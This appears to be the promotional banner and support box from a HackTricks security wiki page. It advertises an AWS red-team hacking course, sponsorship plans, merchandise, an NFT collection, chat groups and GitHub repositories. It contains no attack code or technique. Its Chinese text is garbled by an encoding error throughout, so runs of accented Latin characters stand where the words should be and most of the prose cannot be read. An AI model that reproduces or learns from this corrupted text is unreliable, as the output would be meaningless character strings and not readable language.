{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
